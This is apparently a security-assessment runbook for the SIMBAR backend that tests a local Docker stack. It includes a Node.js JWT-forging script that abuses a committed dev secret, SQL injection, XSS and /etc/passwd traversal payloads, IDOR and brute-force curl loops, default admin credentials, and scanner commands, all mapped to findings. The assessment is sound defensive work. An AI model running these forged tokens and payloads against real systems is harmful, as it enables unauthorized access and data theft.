# VAPT — Vulnerability Assessment & Penetration Testing

Runbook for the SIMBAR backend security assessment performed on branch `kasyfil-integrations` (2026-08-19).
All findings, evidence, and remediation are in [`QA_REPORT.md`](./QA_REPORT.md) §10.

---

## 0. Prerequisites

- Docker running, with the app stack up on `http://localhost:8080`.
- `curl`, `jq`, `node` (for the JWT forge helper) on the host.

```bash
# Start the target stack (backend/docker-compose.yml)
cd backend
docker compose up --build -d
```

Variables used throughout:

```bash
BASE="http://localhost:8080/api/v1"
SECRET="dev-only-jwt-secret-change-me-0123456789"   # committed dev secret (see SEC-01)
```

---

## 1. JWT forge helper (demonstrates SEC-01 auth bypass)

A helper that signs an arbitrary JWT with a chosen secret/claims. Save as `forge_jwt.js`.

```javascript
#!/usr/bin/env node
// Usage: node forge_jwt.js <secret> <user_id> <username> <roles> <warehouses> [alg]
const crypto = require("crypto");
function b64url(buf) {
    return Buffer.from(buf)
        .toString("base64")
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
}
function sign(input, secret, alg) {
    if (alg === "none") return "";
    return crypto
        .createHmac("sha256", secret)
        .update(input)
        .digest("base64")
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
}
const [, , secret, uid, uname, rolesStr, whStr, alg = "HS256"] = process.argv;
const now = Math.floor(Date.now() / 1000);
const header = { alg, typ: "JWT" };
const payload = {
    user_id: Number(uid),
    username: uname,
    roles: rolesStr.split(","),
    warehouses: whStr.split(","),
    sub: String(uid),
    iat: now,
    exp: now + 900,
    jti: "forged-" + crypto.randomBytes(8).toString("hex"),
};
const h = b64url(JSON.stringify(header));
const p = b64url(JSON.stringify(payload));
console.log(h + "." + p + "." + sign(h + "." + p, secret, alg));
```

**What it does:** mints a valid HS256 JWT using the known dev secret. Because the backend trusts any token signed with that secret, an attacker who knows the secret can mint a token with `roles=["sysadmin"]` for any warehouse — this is the SEC-01 CRITICAL finding.

```bash
# Forge a sysadmin token for WH01
ADMIN=$(node forge_jwt.js "$SECRET" 1 admin sysadmin WH01)
# Use it
curl -s "$BASE/users" -H "Authorization: Bearer $ADMIN" -H 'X-Warehouse-Id: WH01' | jq
```

---

## 2. Manual penetration tests

### A. Authentication

```bash
# A1 — no token on a protected route (expect 401)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/users" -H 'X-Warehouse-Id: WH01'

# A3 — forged sysadmin token (expect 200 → CRITICAL bypass, SEC-01)
curl -s "$BASE/users" -H "Authorization: Bearer $(node forge_jwt.js "$SECRET" 999 hacker sysadmin WH01)" -H 'X-Warehouse-Id: WH01'

# A4 — forged token with WRONG secret (expect 401)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/users" \
  -H "Authorization: Bearer $(node forge_jwt.js "wrong-secret-xxxxx" 999 hacker sysadmin WH01)" -H 'X-Warehouse-Id: WH01'

# A5 — alg=none token (expect 401; HMAC method enforced)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/users" \
  -H "Authorization: Bearer $(node forge_jwt.js "$SECRET" 999 hacker sysadmin WH01 none)" -H 'X-Warehouse-Id: WH01'

# A7 — SQL injection in login username (expect 401, not 200)
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"admin\" OR 1=1 --","password":"x"}'

# A8 — default seeded credentials (expect 200 → SEC-04 MEDIUM)
curl -s -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Admin@123456"}' | jq -r '.data.access_token'
```

### B. RBAC / authorization

```bash
REQ=$(node forge_jwt.js "$SECRET" 500 requester requester WH01)
WH2=$(node forge_jwt.js "$SECRET" 600 wh2only inventory_manager WH02)

# B1/B2 — low-priv role on admin routes (expect 403)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/users" -H "Authorization: Bearer $REQ" -H 'X-Warehouse-Id: WH01'
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$BASE/partners" -H "Authorization: Bearer $REQ" \
  -H 'X-Warehouse-Id: WH01' -H 'Content-Type: application/json' \
  -d '{"code":"RBAC-BYP","partner_type":"supplier","name":"x"}'

# B3/B4 — warehouse assignment on header (expect 403 / 200)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/items" -H "Authorization: Bearer $WH2" -H 'X-Warehouse-Id: WH01'
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/items" -H "Authorization: Bearer $WH2" -H 'X-Warehouse-Id: WH02'

# B5 — missing X-Warehouse-Id header (expect 400)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/items" -H "Authorization: Bearer $ADMIN"
```

### C. Injection & XSS

```bash
# C1 — SQLi in ?search (expect 200, no error → parameterized)
curl -s -o /dev/null -w '%{http_code}\n' \
  "$BASE/stock/batches?search=SKU-001%27%20OR%20%271%27=%271" \
  -H "Authorization: Bearer $ADMIN" -H 'X-Warehouse-Id: WH01'

# C2 — XSS payload in username (expect NO reflection)
curl -s -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"<script>alert(1)</script>","password":"x"}' | grep -c '<script>alert(1)</script>'
```

### D. Rate limiting (login brute-force)

```bash
# D1 — 30x bad login, then check last code (expect 429 → sliding window 25/15min)
for i in $(seq 1 30); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$BASE/auth/login" \
    -H 'Content-Type: application/json' -d '{"username":"admin","password":"wrong"}'
done | tail -1
```

### E. Transport / CORS

```bash
# E1 — HSTS on http (expect ABSENT → SEC-06 LOW)
curl -s -o /dev/null -D - "$BASE/ping" | grep -i 'strict-transport-security'

# E2 — CORS preflight from hostile origin (expect no Access-Control-Allow-Origin)
curl -s -D - -o /dev/null -X OPTIONS "$BASE/ping" \
  -H 'Origin: http://evil.example.com' -H 'Access-Control-Request-Method: GET' | grep -i 'access-control-allow-origin'
```

### F. Broken Object-Level Authorization (BOLA/IDOR → SEC-02 HIGH)

```bash
# F1 — admin creates a WH01 receipt
DOCID=$(curl -s -X POST "$BASE/receipts" -H "Authorization: Bearer $ADMIN" -H 'X-Warehouse-Id: WH01' \
  -H 'Content-Type: application/json' \
  -d '{"warehouse_id":1,"lines":[{"item_id":4,"qty":5,"uom":"PCS","batch_no":"IDOR-2608","expiry_date":"2027-01-01"}]}' | jq -r '.data.id')

# F2 — WH02-only user reads that WH01 receipt (expect 403/404, but returns 200 → VULN)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/documents/$DOCID" -H "Authorization: Bearer $WH2" -H 'X-Warehouse-Id: WH02'

# F3 — WH02-only user lists WH01 docs via query param (returns 200 → VULN)
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/documents?warehouse_id=1" -H "Authorization: Bearer $WH2" -H 'X-Warehouse-Id: WH02'
```

### G. Path traversal

```bash
# G1 — traversal in attachment id (expect 404/422, NOT 200)
curl -s -o /dev/null -w '%{http_code}\n' \
  "$BASE/receipts/1/attachments/../../../etc/passwd" \
  -H "Authorization: Bearer $ADMIN" -H 'X-Warehouse-Id: WH01'
```

### H. Security headers (positive control P-10)

```bash
curl -s -o /dev/null -D - "$BASE/ping" | grep -iE \
  '^(x-content-type-options|x-frame-options|x-xss-protection|content-security-policy|referrer-policy|permissions-policy|cache-control)'
```

### I. Info disclosure (SEC-05 LOW)

```bash
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/openapi.json"   # 200 → spec exposed
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/swagger  # 200 → UI exposed
```

---

## 3. Automated scanners (Docker-based)

### 3.1 Nikto — web server fingerprinting / misconfiguration

```bash
docker run --rm --network host alpine:3.20 sh -c \
  "apk add --no-cache git perl perl-net-ssleay perl-xml-writer >/dev/null 2>&1 \
   && git clone --depth 1 -q https://github.com/sullo/nikto /nikto \
   && cd /nikto && perl program/nikto.pl -host http://localhost:8080 -Tuning 1234bde"
```

**What it does:** Nikto sends ~4,500 requests probing for outdated components, dangerous files/CGI, and missing security headers, and reports on response headers/banners. Result here: only 2 informational items — a `x-request-id` header and the missing `Strict-Transport-Security` (confirming SEC-06). No server-banner leak. (Run from `sullo/nikto` source because the Docker Hub `nikto` images are unmaintained.)

### 3.2 OWASP ZAP — web app DAST baseline

```bash
docker run --rm -v "$(pwd)/zap_out:/zap/wrk" --network host ghcr.io/zaproxy/zaproxy \
  zap-baseline.py -t http://localhost:8080 \
  -J /zap/wrk/zap_baseline.json -r /zap/wrk/zap_baseline.html
```

**What it does:** ZAP spiders the target and runs a baseline active scan for the OWASP Top-10 (XSS, SQLi, misconfig, info disclosure, etc.), writing a JSON + HTML report to `./zap_out/`. **Note:** in this environment the `ghcr.io` image pull stalled (throttled registry), so the scan did not complete — the equivalent coverage was done manually (§2). Recommend running this in CI with stable registry access.

### 3.3 Trivy — container image CVE scan

```bash
docker build -t simbar-backend:latest .
docker run --rm aquasec/trivy:latest image \
  --timeout 60m --severity HIGH,CRITICAL --ignore-unfixed --format table \
  simbar-backend:latest
```

**What it does:** Trivy scans the built image's OS packages and Go-module dependencies against known CVEs and emits a table of HIGH/CRITICAL findings. **Note:** Trivy downloads a ~108 MiB vulnerability DB from `mirror.gcr.io`; in this environment that download was throttled and repeatedly died mid-transfer, so no CVE results were produced. A manual composition assessment of the image is in `QA_REPORT.md` §10.5.

---

## 4. Findings → report mapping

| #      | Finding                              | Severity     | Evidence command | Report             |
| ------ | ------------------------------------ | ------------ | ---------------- | ------------------ |
| SEC-01 | JWT secret committed → auth bypass   | **CRITICAL** | §2-A3            | QA_REPORT.md §10.3 |
| SEC-02 | Cross-warehouse BOLA (document read) | **HIGH**     | §2-F2/F3         | QA_REPORT.md §10.3 |
| SEC-03 | Hardcoded AES-256 key for PII        | **HIGH**     | code review      | QA_REPORT.md §10.3 |
| SEC-04 | Default admin credentials active     | **MEDIUM**   | §2-A8            | QA_REPORT.md §10.3 |
| SEC-05 | Public OpenAPI/Swagger               | **LOW**      | §2-I             | QA_REPORT.md §10.3 |
| SEC-06 | No TLS / HSTS                        | **LOW**      | §2-E1, §3.1      | QA_REPORT.md §10.3 |

Positive controls (RBAC, `alg=none`/wrong-secret rejection, rate limiting, security headers, SQLi/XSS resistance, Argon2id) are catalogued in `QA_REPORT.md` §10.4.
